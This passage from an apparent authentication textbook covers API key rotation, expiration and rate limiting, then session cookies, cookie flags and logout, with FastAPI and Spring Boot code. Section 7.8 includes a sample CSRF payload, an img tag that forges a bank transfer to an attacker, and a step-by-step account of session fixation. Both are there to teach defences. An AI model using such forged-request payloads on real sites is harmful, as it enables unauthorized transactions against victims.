**Why it matters:** A key that's been in use for years has had more opportunities to leak — through logs, a compromised CI/CD pipeline, an old backup, a former employee's laptop. Regular rotation limits the *blast radius* of any leak that already happened but hasn't been noticed yet.

**A safe rotation flow (avoiding downtime):**

```
   Time ──────────────────────────────────────────────────────>

   Key A:  [====== active ======][==== grace period ====][revoked]
                                  │
   Key B:                        [========= active =========>
                                  │
                          Key B issued here;
                          BOTH keys valid during
                          the grace period so the
                          client can switch over
                          without a hard cutover
```

> **Common Mistake:** Instantly revoking an old key the moment a new one is issued. In any real system with distributed deployments, config caches, or multiple running instances of a client, this causes a hard outage during the changeover. A grace period where both keys work avoids this.

---

## 6.5 Expiration

**Simple explanation:** Giving every API key a maximum lifetime, after which it stops working automatically, regardless of whether anyone remembered to rotate it.

**Why it matters:** Expiration is a *safety net* under rotation — it guarantees that even a completely forgotten, never-rotated key eventually stops being a standing risk, rather than remaining valid indefinitely by default.

```python
from datetime import datetime, timedelta, timezone

class ApiKeyRecord:
    def __init__(self, key_hash: str, created_at: datetime, ttl_days: int = 365):
        self.key_hash = key_hash
        self.created_at = created_at
        self.expires_at = created_at + timedelta(days=ttl_days)

    def is_expired(self) -> bool:
        return datetime.now(timezone.utc) > self.expires_at
```

> **Interview Tip:** "Should every API key expire?" A nuanced, senior-level answer: not necessarily *automatically forcing* re-issuance on a hard deadline for every use case (some legitimate long-lived server-to-server integrations exist), but every key should at minimum have an expiration *field* and be revocable on demand — an API key system with no way to invalidate a specific key at all is a real design flaw.

---

## 6.6 Rate Limiting

API keys serve a second purpose beyond authentication: they let a server attribute usage to a specific caller, which enables **rate limiting** — capping how many requests a given key can make in a time window.

```
   Client with key sk_live_abc...
        │
        │  Request #1, #2, #3 ... #100 within 1 minute
        │ ─────────────────────────────────────────────>  Server
        │                                                    │
        │                                     [ tracks: sk_live_abc...
        │                                       has made 100 requests
        │                                       in the last 60 seconds ]
        │                                                    │
        │  Request #101 (still within that minute)             │
        │ ─────────────────────────────────────────────>       │
        │                                                    │
        │  <──── 429 Too Many Requests ─────────────────────  │
        │        Retry-After: 15                                │
```

This connects directly back to Chapter 2, section 2.3's "resource exhaustion" problem — without a way to attribute requests to a specific caller, there's no way to fairly cap any single caller's usage, and one misbehaving or malicious client can degrade service for everyone.

**Reference implementation (Python / FastAPI) — a simple in-memory sliding-window rate limiter tied to an API key:**

```python
import time
from collections import defaultdict
from fastapi import FastAPI, Header, HTTPException

app = FastAPI()
REQUEST_LOG: dict[str, list[float]] = defaultdict(list)
RATE_LIMIT = 100        # max requests
WINDOW_SECONDS = 60      # per this many seconds

def check_rate_limit(api_key: str):
    now = time.time()
    window_start = now - WINDOW_SECONDS
    # Drop timestamps outside the current window — this is the
    # "sliding window" (as opposed to a fixed-bucket reset).
    REQUEST_LOG[api_key] = [t for t in REQUEST_LOG[api_key] if t > window_start]

    if len(REQUEST_LOG[api_key]) >= RATE_LIMIT:
        raise HTTPException(
            status_code=429,
            detail="Rate limit exceeded",
            headers={"Retry-After": str(WINDOW_SECONDS)},
        )
    REQUEST_LOG[api_key].append(now)
```

> **Note:** A real production system would use a shared store like Redis rather than an in-memory dict — an in-memory dict only works correctly on a single server instance, and resets on every restart. This simplified version is for illustrating the *concept*; Chapter 13 (Microservices) revisits rate limiting at the API-gateway level, where this exact problem of "shared state across many instances" is solved properly.

---

## 6.7 Full working example — generation, verification, and rate limiting together

```python
# main.py — API Key authentication for the books API
import hashlib
import secrets
import time
from collections import defaultdict
from fastapi import FastAPI, Header, HTTPException

app = FastAPI()

BOOKS = [{"id": 1, "title": "Clean Code", "author": "Robert C. Martin"}]

def hash_key(raw_key: str) -> str:
    # SHA-256 is appropriate here (unlike passwords) BECAUSE API keys
    # already carry 256 bits of entropy from generation (section 6.2) —
    # there's no "weak human-chosen input" problem a slow hash needs to
    # compensate for, unlike passwords (section 5.7).
    return hashlib.sha256(raw_key.encode()).hexdigest()

# Simulated key store: only hashes are kept, per section 6.3.
raw_key = secrets.token_urlsafe(32)
print(f"Issued key (shown once): sk_live_{raw_key}")   # only ever printed at issuance
API_KEY_STORE = {
    hash_key(f"sk_live_{raw_key}"): {"owner": "partner-integration-1", "active": True}
}

REQUEST_LOG: dict[str, list[float]] = defaultdict(list)
RATE_LIMIT, WINDOW_SECONDS = 100, 60

def authenticate_api_key(x_api_key: str | None) -> dict:
    if x_api_key is None:
        raise HTTPException(status_code=401, detail="Missing API key")

    key_hash = hash_key(x_api_key)
    record = API_KEY_STORE.get(key_hash)
    if record is None or not record["active"]:
        raise HTTPException(status_code=401, detail="Invalid or revoked API key")
    return record

def enforce_rate_limit(x_api_key: str):
    now = time.time()
    REQUEST_LOG[x_api_key] = [t for t in REQUEST_LOG[x_api_key] if t > now - WINDOW_SECONDS]
    if len(REQUEST_LOG[x_api_key]) >= RATE_LIMIT:
        raise HTTPException(status_code=429, detail="Rate limit exceeded",
                             headers={"Retry-After": str(WINDOW_SECONDS)})
    REQUEST_LOG[x_api_key].append(now)

@app.get("/books")
def list_books(x_api_key: str | None = Header(default=None, alias="X-API-Key")):
    authenticate_api_key(x_api_key)   # STAGE 1: authentication (Ch. 2, 3)
    enforce_rate_limit(x_api_key)     # attribution-based rate limiting (this chapter)
    return BOOKS
```

```bash
curl -i http://127.0.0.1:8000/books -H "X-API-Key: sk_live_<paste-the-printed-key>"
curl -i http://127.0.0.1:8000/books                              # -> 401, no key
curl -i http://127.0.0.1:8000/books -H "X-API-Key: sk_live_wrong" # -> 401, invalid
```

---

## 6.8 Reference implementation (Spring Boot / Java)

```java
@Component
public class ApiKeyAuthFilter extends OncePerRequestFilter {

    private final ApiKeyRepository apiKeyRepository;

    public ApiKeyAuthFilter(ApiKeyRepository apiKeyRepository) {
        this.apiKeyRepository = apiKeyRepository;
    }

    @Override
    protected void doFilterInternal(HttpServletRequest request,
                                     HttpServletResponse response,
                                     FilterChain chain) throws IOException, ServletException {
        String apiKey = request.getHeader("X-API-Key");

        if (apiKey == null) {
            response.setStatus(HttpServletResponse.SC_UNAUTHORIZED);
            response.getWriter().write("{\"error\":\"Missing API key\"}");
            return;  // stop the chain here — never reach the controller
        }

        String keyHash = DigestUtils.sha256Hex(apiKey);
        Optional<ApiKeyRecord> record = apiKeyRepository.findByKeyHashAndActiveTrue(keyHash);

        if (record.isEmpty()) {
            response.setStatus(HttpServletResponse.SC_UNAUTHORIZED);
            response.getWriter().write("{\"error\":\"Invalid or revoked API key\"}");
            return;
        }

        // Establish identity in Spring Security's context, same role as
        // FastAPI's `authenticate_api_key` returning a record above —
        // downstream code (including authorization checks, Ch.3/11) can
        // now access "who this request is" via the SecurityContext.
        var authToken = new UsernamePasswordAuthenticationToken(
            record.get().getOwner(), null, List.of());
        SecurityContextHolder.getContext().setAuthentication(authToken);

        chain.doFilter(request, response);  // proceed to the controller
    }
}
```

**What's happening internally:** `OncePerRequestFilter` is Spring's mechanism for inserting custom logic into the filter chain that runs before controllers — the same architectural slot `.httpBasic()` occupied in Chapter 5, just implemented manually here since `X-API-Key` isn't one of Spring Security's built-in schemes. This mirrors the FastAPI dependency function almost exactly in *purpose*, even though the surrounding framework machinery differs.

---

## 6.9 Advantages and disadvantages

| Advantages | Disadvantages |
|---|---|
| Simple to issue, distribute, and use | Bearer-token risk applies fully (Chapter 4) — theft = full access until revoked |
| No password/username coupling — ideal for machine-to-machine | Typically identifies an *application/account*, not an individual human — poor fit when you need per-user identity |
| Easy per-key revocation without affecting other keys on the same account | If not rotated/expired, can become a long-lived, high-value target |
| Enables clean usage attribution for billing, quotas, rate limiting | No built-in standard for fine-grained scopes/permissions (unlike OAuth, Chapter 9) — usually bolted on separately |
| Works well for public API products (weather, maps, payment gateways) | Not designed for browser-based user login flows — awkward UX if misapplied there |

---

## 6.10 Real-world usage patterns

- **Public API products** (maps, weather, payment processing, SMS/email sending services) almost universally use API keys as the primary or first-layer credential — you've very likely generated dozens of these in developer dashboards already.
- **Internal service-to-service calls** within a microservices architecture sometimes use API keys for simple cases, though mTLS or short-lived tokens (Chapter 13) are often preferred for higher-security internal environments.
- **Combined with other schemes**: it's common to see an API key identify *which application/partner* is calling, layered underneath a separate, per-end-user token (JWT/OAuth, Chapters 8–9) identifying *which individual user* that application is acting on behalf of — two different questions, two different credentials, working together.

---

## Chapter 6 Summary

- **API keys** identify an application/account/integration (not typically an individual human) — the machine-to-machine counterpart to Basic Auth's human-login model.
- Generate keys with a **CSPRNG** and sufficient entropy (256 bits is a solid default); never use predictable inputs.
- **Store only a hash** of the key (fast hash like SHA-256 is fine here, unlike passwords) — show the raw key exactly once, at issuance.
- **Rotation** limits the blast radius of undetected leaks; use a grace period with both old and new keys valid to avoid hard cutovers.
- **Expiration** is a safety net under rotation, guaranteeing forgotten keys eventually stop being a standing risk.
- API keys enable **rate limiting** by giving the server a stable identity to attribute usage to — directly solving the "resource exhaustion" gap identified back in Chapter 2.
- Real systems often layer an API key (identifying the calling application) *underneath* a separate per-user credential (JWT/OAuth, Chapters 8–9) identifying the individual end user.

---

## Interview Questions — Chapter 6

**Q1. How is an API key different from a password, conceptually?**
A password is chosen by (and meaningful to) a human and typically identifies an individual user account, verified via a login step. An API key is a machine-generated, high-entropy random string identifying an application/account/integration, typically with no separate "login" — it's presented directly as a bearer credential on every request.

**Q2. Why is it acceptable to use a fast hash (SHA-256) for API keys but not for passwords?**
Passwords are human-chosen and often weak/predictable/reused, so a fast hash lets an attacker who steals the hash table brute-force many candidate passwords per second — slow, purpose-built hashing (Chapter 12) is needed to make that infeasible. API keys are already high-entropy random values from generation (256 bits, section 6.2) — there's no "weak input" for an attacker to brute-force through, so a fast cryptographic hash is sufficient.

**Q3. Why use a grace period during key rotation instead of revoking the old key immediately?**
Immediate revocation causes a hard cutover — any client, cached config, or distributed deployment still using the old key breaks instantly. A grace period where both old and new keys remain valid lets consumers switch over gradually without an outage.

**Q4. How do API keys enable rate limiting, and why does that matter?**
Because each key uniquely and stably identifies a specific caller, the server can track and cap how many requests that specific caller makes in a time window. This matters because, without any stable per-caller identity, there's no way to fairly limit one bad or overly aggressive client without affecting everyone else (Chapter 2's resource exhaustion problem).

**Q5. In what real-world scenario might you use both an API key AND a JWT together, rather than choosing one or the other?**
When an application (identified by an API key) is acting on behalf of individual end users (each identified by their own JWT) — e.g., a third-party app integrating with your platform: the API key attributes usage/billing to the integrating application, while the JWT identifies which specific one of that application's end users the request is being made for.

---

## Hands-On Exercises — Chapter 6

1. Run the full example in section 6.7, capture the printed key, and successfully call `/books` with it. Then modify one character of the key and confirm you get a clean 401, not a crash.
2. Extend the rate limiter to return, in the `429` response body, exactly how many seconds until the caller's oldest request ages out of the window (rather than always returning the full `WINDOW_SECONDS`).
3. Design (on paper) a database schema for an `api_keys` table supporting section 6.3 (hash-only storage) and 6.4 (rotation with grace periods) — include at minimum: `key_hash`, `key_prefix`, `owner_id`, `created_at`, `expires_at`, `active`.
4. Explain, in 3–4 sentences, why storing a raw API key directly in a `.env` file committed to a public GitHub repository is a real, common, and serious incident category — connect it explicitly to the "prefix convention" from section 6.2.

## Mini Project — Chapter 6

Build a small **API key management service** on top of the books API.

Requirements:
- `POST /api-keys` (itself protected by Basic Auth from Chapter 5 — an authenticated human issuing keys for their own integrations) → generates and returns a new raw key (shown once), storing only its hash.
- `GET /books` → requires a valid `X-API-Key` header, and is rate-limited to 10 requests per minute per key.
- `DELETE /api-keys/{prefix}` → revokes a specific key by its stored prefix (not the full key — the full key should never be retrievable again after issuance, per section 6.3).
- Demonstrate the full lifecycle: issue a key, use it successfully, exceed its rate limit (confirm `429`), revoke it, and confirm subsequent use returns `401`.

---

## Preparing for Chapter 7

Both Basic Auth and API Keys share one trait: the credential itself is re-sent, in full, on every single request. Chapter 7 introduces a fundamentally different model — **sessions and cookies** — where a one-time login exchanges credentials for a short, opaque, server-tracked identifier, and *that* is what travels on subsequent requests instead. This is also where you'll meet, in full depth, the automatic-cookie-attachment mechanism previewed back in Chapter 4.

---

*End of Chapter 6.*

---

# Chapter 7 — Sessions and Cookies

## 7.0 Where we left off

Both schemes so far — Basic Auth (Chapter 5) and API Keys (Chapter 6) — share a trait worth naming explicitly: the *actual, sensitive credential* (a password, a raw key) travels on **every single request**, forever. Sessions solve this differently: prove your identity **once**, at login, and receive back a short-lived, meaningless-if-stolen-in-isolation identifier to use instead. This chapter builds that mechanism in full, including the automatic-cookie-attachment behavior previewed in Chapter 4.

---

## 7.1 The core idea

**Simple explanation:** You log in once with your real credentials. The server remembers you and hands you a claim ticket. You show the claim ticket (not your real credentials) on every future request.

**Technical definition:** A **session** is server-side state associated with a specific, already-authenticated identity, referenced by a **session ID** — a random, unpredictable identifier the client presents on subsequent requests instead of re-sending real credentials.

**Real-world analogy — the coat check:**

```
   You arrive at a theater, hand your coat to the coat-check attendant
   (this is the LOGIN — you prove who you are / hand over the real item).

   You receive a numbered ticket stub (this is the SESSION ID).

   For the rest of the evening, you show the STUB — not your ID,
   not a description of your coat — to get your coat back.
   The stub itself means nothing to anyone else; only the coat-check
   attendant's records (the SERVER-SIDE SESSION STORE) can map
   "stub #4471" back to "the blue coat belonging to Anuj."
```

This is a fundamentally different trust model from Chapters 5–6: a stolen session ID is bad, but it's bounded (expires, can be revoked, doesn't reveal the underlying password), whereas a stolen password (Chapter 5) or API key (Chapter 6) is a much larger, more direct compromise.

---

## 7.2 Cookies — the transport mechanism

You met `Cookie`/`Set-Cookie` in Chapter 4 (section 4.6) as a header pair; here's the full picture of *why* cookies specifically are used to carry a session ID, rather than, say, requiring the client to manually attach a header (as with `Authorization`).

**Technical definition:** A cookie is a small piece of data a server asks a browser to store (via `Set-Cookie`), which the browser then automatically re-attaches (via the `Cookie` header) to every subsequent request that matches the cookie's `Domain` and `Path` scope — with zero application code required on the client side to make that re-attachment happen.

```
   Login:
     Client ──── POST /login {username, password} ───────> Server
     Client <─── Set-Cookie: session_id=a1b2c3; ... ─────── Server

   [ Browser silently stores session_id=a1b2c3 ]

   Every subsequent request to a matching domain, AUTOMATICALLY,
   with no JavaScript or app code needed:
     Client ──── GET /books
                 Cookie: session_id=a1b2c3 ──────────────> Server
```

This automatic behavior is *specifically* why session-based auth is a natural fit for traditional browser-based web apps, and a comparatively awkward fit for mobile apps or pure API clients (which have no "browser" automatically managing cookie storage/attachment for them) — a distinction that becomes very relevant when comparing to JWT in section 7.9.

---

## 7.3 Session IDs — what makes them safe

**Simple explanation:** A session ID must be as unguessable as the API keys from Chapter 6 — if an attacker can guess or predict a valid session ID, they can hijack that session without ever touching a password.

**Technical explanation:** Exactly the same principle as section 6.2 applies: generate session IDs using a CSPRNG with sufficient entropy (128+ bits is typical), never from predictable sources like sequential integers, timestamps, or weakly-seeded random functions.

> **Common Mistake:** Using an incrementing integer or a predictable value (like a hash of the username + timestamp) as a session ID. This has been a real, exploited vulnerability class historically — an attacker who notices session IDs are sequential can simply try nearby values to hijack other users' sessions.

---

## 7.4 Server-side sessions — where the state actually lives

**Simple explanation:** The session ID itself is meaningless without the server's own record of what it maps to — that record is the actual "session," stored on the server.

```
   SESSION STORE  (in-memory, Redis, or a database table)
   ┌──────────────┬─────────┬─────────────────────┬────────────┐
   │ session_id    │ user_id │ created_at            │ expires_at │
   ├──────────────┼─────────┼─────────────────────┼────────────┤
   │ a1b2c3...      │ 8823     │ 2026-08-05T09:00:00Z  │ ...+30min   │
   └──────────────┴─────────┴─────────────────────┴────────────┘
```

On every request, the server looks up the presented `session_id` in this store; if found and not expired, it resolves to `user_id: 8823`, and processing continues exactly as in the generic auth sequence from Chapter 2 (section 2.6) — the session ID is simply the "credential" in that diagram, and the session store is the "identity store."

> **Interview Tip:** "Is session-based authentication stateless?" No — and this is a genuinely important distinction from later chapters. Session auth requires the server to maintain state (the session store) about every logged-in user. This is explicitly *not* how JWT works (Chapter 8), and the trade-offs of stateful vs. stateless authentication are a common, substantive interview topic — you now have the concrete example (sessions) to compare JWT against once you reach it.

---

## 7.5 Cookie flags in depth

Previewed in Chapter 4; here is the full reasoning behind each one.

| Flag | What it does | Why it matters |
|---|---|---|
| `HttpOnly` | Prevents JavaScript (`document.cookie`) from reading this cookie | Blocks a major class of cookie-theft via injected malicious scripts (XSS, covered fully in Ch.12) — even if an attacker gets JS running on your page, they can't read an `HttpOnly` cookie |
| `Secure` | Cookie is only ever transmitted over HTTPS | Prevents the exact plaintext-interception risk described for Basic Auth in Chapter 5, applied to session cookies |
| `SameSite` | Controls whether the cookie is sent on cross-site requests | Mitigates CSRF (section 7.8) by restricting when a cookie gets attached to requests originating from other websites |
| `Max-Age` / `Expires` | Sets how long the browser retains the cookie | Bounds how long a stolen cookie remains useful even before server-side expiration kicks in |

```http
Set-Cookie: session_id=a1b2c3; HttpOnly; Secure; SameSite=Strict; Max-Age=1800; Path=/
```

**`SameSite` values, precisely:**

| Value | Behavior |
|---|---|
| `Strict` | Cookie never sent on any cross-site request, even top-level navigation from a link on another site |
| `Lax` | Cookie sent on top-level navigation (e.g., clicking a link) but not on cross-site subrequests (e.g., an `<img>` or background `fetch` from another site) — this is most browsers' default today |
| `None` | Cookie sent on all requests regardless of origin — requires `Secure` to be set alongside it; needed for legitimate cross-site use cases (e.g., an embedded widget), but weakens CSRF protection, so it should be a deliberate, justified choice, not a default |

> **Remember:** For a typical session cookie protecting user data, `HttpOnly; Secure; SameSite=Lax` (or `Strict`, if your app has no legitimate cross-site navigation flows) is the standard, safe baseline.

---

## 7.6 The full login and logout flow

**Login flow:**

```
   Client                                          Server
     │                                                │
     │  POST /login                                    │
     │  {"username":"anuj","password":"secret123"}      │
     │ ──────────────────────────────────────────────>│
     │                                                │  1. Verify credentials
     │                                                │     (exactly like Ch.5's
     │                                                │      Basic Auth check —
     │                                                │      hashed password compare)
     │                                                │  2. Generate a new,
     │                                                │     high-entropy session_id
     │                                                │  3. Store {session_id -> user_id}
     │                                                │     in the session store, with
     │                                                │     an expiration time
     │  Set-Cookie: session_id=...; HttpOnly; Secure    │
     │  200 OK  {"message": "logged in"}                │
     │ <──────────────────────────────────────────────│
```

**Logout flow — the key difference from Basic Auth (Chapter 5), which had no logout concept at all:**

```
   Client                                          Server
     │                                                │
     │  POST /logout                                   │
     │  Cookie: session_id=a1b2c3                       │
     │ ──────────────────────────────────────────────>│
     │                                                │  DELETE the session_id
     │                                                │  entry from the session
     │                                                │  store entirely
     │  Set-Cookie: session_id=; Max-Age=0               │  (tells browser to
     │  200 OK                                          │   discard the cookie too)
     │ <──────────────────────────────────────────────│
```

Because the server actually *owns* session state, logout is a real, immediate, server-enforced action — the session ID stops working the instant it's deleted from the store, even if a copy of the old cookie somehow persisted on the client. This is a meaningful advantage over the bearer-token model from Chapter 4 in general (revisited critically in section 7.9).

---

## 7.7 Session expiration

Two complementary timers are typically used together:

- **Absolute expiration:** the session is invalid after a fixed duration from login, no matter how active the user is (e.g., "always log out after 8 hours").
- **Idle/sliding expiration:** the session is invalid after a period of *inactivity*, refreshed on each request (e.g., "log out after 30 minutes of no activity").

```python
def is_session_valid(session: dict) -> bool:
    now = datetime.now(timezone.utc)
    if now > session["absolute_expiry"]:
        return False
    if now > session["last_activity"] + timedelta(minutes=30):
        return False
    return True
```

> **Common Mistake:** Implementing only idle expiration with no absolute cap. An attacker who steals a valid session cookie and keeps it "active" (by periodically replaying it) could otherwise extend a hijacked session indefinitely. An absolute maximum lifetime is an important backstop.

---

## 7.8 Session fixation and CSRF — two distinct attacks

These are commonly confused; they are genuinely different attack shapes.

**Session fixation:** an attacker *sets* a known session ID on a victim's browser *before* login, then waits for the victim to log in (which, if the server carelessly reuses the same pre-existing session ID rather than issuing a fresh one, "fixes" that now-authenticated session to a value the attacker already knows).

```
   1. Attacker tricks victim into using session_id=KNOWN123
      (e.g., via a crafted link, if the app accepts session
       IDs from URL parameters — a bad practice on its own)
   2. Victim logs in; server carelessly KEEPS session_id=KNOWN123
      and just marks it "authenticated" rather than issuing a new one
   3. Attacker, who already knows KNOWN123, is now also logged in
      as the victim
```

> **Best Practice:** Always issue a **brand new** session ID upon successful login, even if a session ID already existed on the incoming request. Never let the pre-login session ID "become" the authenticated session.

**CSRF (Cross-Site Request Forgery):** relies on the browser's *automatic* cookie attachment (section 7.2) working *against* the user — a malicious site causes the victim's browser to send a request to your API, and because cookies are attached automatically regardless of which site triggered the request, your server may honor it as if the victim intended it.

```
   Victim is logged into mybank.com (has a valid session cookie).
   Victim visits evil-site.com in another tab.
   evil-site.com's page contains:
     <img src="https://mybank.com/accounts/8823/transfer?to=attacker&amount=50000">

   Victim's browser AUTOMATICALLY attaches mybank.com's session
   cookie to this request, because that's simply how cookies work
   (section 7.2) — mybank.com's server sees what looks like a
   perfectly valid, authenticated request.
```

> **Remember:** CSRF is possible *specifically because* cookie attachment is automatic and origin-agnostic by default. This is exactly why `SameSite` (section 7.5) exists, and why sensitive state-changing endpoints often additionally require a separate **CSRF token** — a random value embedded in the legitimate page's form/JS, which a forged cross-site request cannot know to include, giving the server a way to distinguish a genuine same-site request from a forged one even when the cookie itself is auto-attached identically in both cases. Full mitigation detail belongs to Chapter 12.

---

## 7.9 Advantages, disadvantages, and comparison with JWT

| | Sessions (this chapter) | JWT (preview of Chapter 8) |
|---|---|---|
| Server-side state required? | Yes — a session store | No — self-contained token |
| Instant revocation | Easy (delete from store) | Hard (token remains valid until it naturally expires, unless extra infrastructure like a blacklist is added — Ch.8) |
| Scales across multiple servers | Requires a shared session store (e.g., Redis) | Naturally stateless — any server can verify independently |
| Natural fit for | Traditional browser-based web apps | Mobile apps, SPAs, cross-domain APIs, microservices |
| Cookie auto-attachment convenience | Yes (a real advantage for browser apps) | N/A — typically sent manually via `Authorization: Bearer` |
| CSRF exposure | Yes, if not mitigated (section 7.8) | Generally lower CSRF exposure (no automatic attachment), but introduces other risks (Ch.8, Ch.12) |

This table is deliberately here at the end of the chapter, rather than presented as "sessions are the old way, JWT is the new way" — the honest, senior-level answer is that **each has real, situational advantages**, which is exactly why both remain in wide production use today, and why this book covers both in full rather than treating one as obsolete.

---

## 7.10 Reference implementation (Python / FastAPI)

```python
import secrets
from datetime import datetime, timedelta, timezone
from fastapi import FastAPI, HTTPException, Cookie, Depends, Response
from pydantic import BaseModel

app = FastAPI()

USER_STORE = {"anuj": "secret123"}   # simplified; real version hashes, per Ch.5
SESSION_STORE: dict[str, dict] = {}
IDLE_TIMEOUT_MINUTES = 30      # section 7.7 — sliding expiration
ABSOLUTE_TIMEOUT_HOURS = 8     # section 7.7 — hard backstop

class LoginRequest(BaseModel):
    """Credentials belong in the request BODY, never the query string.

    This class is not decoration — without it, FastAPI treats plain
    `username: str, password: str` parameters as QUERY parameters, so the
    password would land in the URL (and therefore in server logs, browser
    history, and Referer headers) — exactly the anti-pattern Chapter 4,
    section 4.5 warned about for API keys.
    """
    username: str
    password: str

@app.post("/login")
def login(body: LoginRequest, response: Response):
    if USER_STORE.get(body.username) != body.password:
        raise HTTPException(status_code=401, detail="Invalid credentials")

    # Always issue a FRESH session id on login — defends against
    # session fixation, section 7.8.
    session_id = secrets.token_urlsafe(32)
    now = datetime.now(timezone.utc)
    SESSION_STORE[session_id] = {
        "user": body.username,
        "last_activity": now,                                          # idle timer
        "absolute_expiry": now + timedelta(hours=ABSOLUTE_TIMEOUT_HOURS),  # hard cap
    }

    response.set_cookie(
        key="session_id",
        value=session_id,
        httponly=True,   # section 7.5
        secure=True,      # section 7.5 — in real HTTPS deployment
        samesite="lax",   # section 7.5, 7.8
        max_age=IDLE_TIMEOUT_MINUTES * 60,
    )
    return {"message": "logged in"}

def require_session(session_id: str | None = Cookie(default=None)) -> dict:
    if session_id is None:
        raise HTTPException(status_code=401, detail="Not logged in")
    session = SESSION_STORE.get(session_id)
    if session is None:
        raise HTTPException(status_code=401, detail="Session expired or invalid")

    now = datetime.now(timezone.utc)
    # BOTH timers from section 7.7 are enforced, not just one.
    idle_expired = now > session["last_activity"] + timedelta(minutes=IDLE_TIMEOUT_MINUTES)
    absolute_expired = now > session["absolute_expiry"]
    if idle_expired or absolute_expired:
        SESSION_STORE.pop(session_id, None)   # clean up the dead record
        raise HTTPException(status_code=401, detail="Session expired or invalid")

    session["last_activity"] = now   # slide the idle window forward
    return session

@app.get("/books")
def list_books(session: dict = Depends(require_session)):
    return [{"id": 1, "title": "Clean Code", "owner_context": session["user"]}]

@app.post("/logout")
def logout(response: Response, session_id: str | None = Cookie(default=None)):
    if session_id:
        SESSION_STORE.pop(session_id, None)   # server-side, immediate invalidation
    response.delete_cookie("session_id")       # tell the browser to discard it too
    return {"message": "logged out"}
```

**What's happening internally:** `Cookie(default=None)` is FastAPI's cookie-reading equivalent of the `Header()` mechanism from Chapter 4 — it reads the incoming `Cookie` request header and extracts the named value. `response.set_cookie(...)` constructs the correct `Set-Cookie` response header, with all the flags from section 7.5, without you needing to hand-format the header string yourself. Note that `require_session` performs *only* authentication (resolving a session to a user) — following the Chapter 3 pattern of keeping authentication logic separate and reusable.

> **Running this locally — the confusing part, read this before you debug for an hour.** With `secure=True`, the client **will not send the cookie back over plain `http://`** — that is the flag doing exactly its job (section 7.5). So on a local `uvicorn` server without TLS you will see: `POST /login` → `200 OK` with a `Set-Cookie` header present and correct, and then `GET /books` → `401`, as if login silently failed. Nothing is broken. Either run behind HTTPS, or set `secure=False` **only** in local development driven by a config flag:
>
> ```python
> import os
> IS_PRODUCTION = os.getenv("ENV") == "production"
> response.set_cookie(..., secure=IS_PRODUCTION, ...)
> ```
>
> Never hardcode `secure=False` "temporarily" — that is precisely how it reaches production, and it re-opens the plaintext-interception risk from Chapter 5, section 5.8.

> **Common Mistake — the one that silently disables your entire authentication layer:** notice `Depends(require_session)`, not a bare `= require_session`. Writing `def list_books(session: dict = require_session)` is valid Python and FastAPI will start without complaint — but `require_session` is then just a *default value*, and **FastAPI never calls it**. The endpoint returns `200 OK` to a request carrying no cookie at all, with `session` holding a function object instead of a session. This is a genuinely dangerous bug class because nothing errors out: the tests you write against the happy path (log in, then call `/books`) still pass, and only a request with *no* credentials — which you probably never test — reveals the hole. **`Depends()` is what turns a plain function into an actually-executed dependency.** Whenever you add a protected endpoint, test it *unauthenticated first*, and confirm you get a 401.

---

## 7.11 Reference implementation (Spring Boot / Java)

```java
@RestController
public class SessionAuthController {

    private final SessionStore sessionStore;  // wraps Redis or in-memory map

    @PostMapping("/login")
    public ResponseEntity<?> login(@RequestBody LoginRequest req, HttpServletResponse response) {
        if (!userService.verifyCredentials(req.username(), req.password())) {
            return ResponseEntity.status(401).body(Map.of("error", "Invalid credentials"));
        }

        String sessionId = UUID.randomUUID().toString(); // backed by SecureRandom in the
                                                            // JDK (~122 bits of entropy),
                                                            // so this is acceptable; a
                                                            // direct SecureRandom call is
                                                            // clearer about intent
        sessionStore.save(sessionId, req.username(), Duration.ofMinutes(30));

        // ResponseCookie, NOT the servlet `new Cookie(...)` — see the note below.
        ResponseCookie cookie = ResponseCookie.from("session_id", sessionId)
            .httpOnly(true)     // section 7.5
            .secure(true)
            .sameSite("Lax")    // section 7.5, 7.8 — the CSRF-relevant flag
            .path("/")
            .maxAge(Duration.ofMinutes(30))
            .build();
        response.addHeader(HttpHeaders.SET_COOKIE, cookie.toString());

        return ResponseEntity.ok(Map.of("message", "logged in"));
    }

    @GetMapping("/books")
    public List<Book> listBooks(@CookieValue(value = "session_id", required = false) String sessionId) {
        SessionRecord session = sessionStore.find(sessionId)
            .orElseThrow(() -> new ResponseStatusException(HttpStatus.UNAUTHORIZED));
        return bookRepository.findAll();
    }

    @PostMapping("/logout")
    public ResponseEntity<?> logout(@CookieValue(value = "session_id", required = false) String sessionId,
                                     HttpServletResponse response) {
        if (sessionId != null) sessionStore.delete(sessionId);
        ResponseCookie expired = ResponseCookie.from("session_id", "")
            .httpOnly(true).secure(true).sameSite("Lax").path("/")
            .maxAge(0)   // tells the browser to discard it immediately
            .build();
        response.addHeader(HttpHeaders.SET_COOKIE, expired.toString());
        return ResponseEntity.ok(Map.of("message", "logged out"));
    }
}
```

`@CookieValue` is Spring's direct equivalent of FastAPI's `Cookie(...)` parameter — reading straight from the `Cookie` request header, matching the same underlying HTTP mechanism from section 7.2 regardless of framework.

> **Common Mistake — the missing `SameSite` flag in Java:** the servlet API's `jakarta.servlet.http.Cookie` class has **no `setSameSite()` method at all**. Code written with `new Cookie(...)` therefore silently ships a session cookie with *no* `SameSite` attribute — and while modern browsers now default to `Lax`, you are relying on browser defaults for a security control instead of stating it, and older or non-browser clients may not apply it. Spring's `ResponseCookie` builder (used above) emits the attribute explicitly, which is why it — not `new Cookie(...)` — is the correct choice for any cookie that matters. Verify with `curl -i` and read the literal `Set-Cookie` line; never assume the flag is there because you intended it.
>
> Note also that both cookie deletions above re-specify `path`, `secure`, and `httpOnly`. A browser only overwrites a stored cookie when the **name, domain, and path all match** — a "delete" that omits `Path=/` will not clear a cookie that was originally set with `Path=/`, leaving the user apparently logged in. The server-side `sessionStore.delete(...)` is what actually ends the session (section 7.6), but a stale cookie left in the browser produces confusing behavior and should be cleared correctly.

---

## Chapter 7 Summary

- A **session** is server-side state tied to an identity, referenced by a **session ID** the client presents instead of real credentials — proven once at login, unlike Basic Auth/API Keys which repeat the real credential every request.
- **Cookies** carry the session ID, and are **automatically attached by the browser** — a real convenience for browser apps, and the root cause enabling **CSRF**.
- Session IDs need the same high-entropy, CSPRNG generation as API keys (Chapter 6) to resist guessing.
- Session **state lives server-side** — sessions are explicitly *not* stateless, unlike JWT (previewed here, built in Chapter 8).
- Cookie flags (`HttpOnly`, `Secure`, `SameSite`) each defend against a specific, named risk — script-based theft, network interception, and cross-site forgery respectively.
- **Logout is a real, immediate, server-enforced action** with sessions — a genuine advantage over pure bearer-token schemes.
